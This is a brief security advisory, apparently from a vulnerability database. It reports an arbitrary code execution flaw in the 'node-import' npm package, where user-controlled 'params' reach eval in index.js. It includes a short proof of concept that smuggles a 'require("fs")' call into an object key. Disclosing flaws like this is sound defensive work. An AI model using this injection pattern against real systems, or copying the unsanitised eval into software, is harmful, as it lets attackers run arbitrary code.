# Overview

`node-import` is a package that imports dependencies and run it directly or concatenate them and exports to file.

This package is vulnerable to Arbitrary Code Execution. The `params` argument of the module function can be controlled by users without any sanitization. This is then provided to the `eval` function located in line 79 in the index file `index.js`.

# Proof of Concept

```
var a = require("node-import");
var params = { 'fs=require("fs");
fs.writeFile("JHU");//':123 }
a.module('', params, true)
```
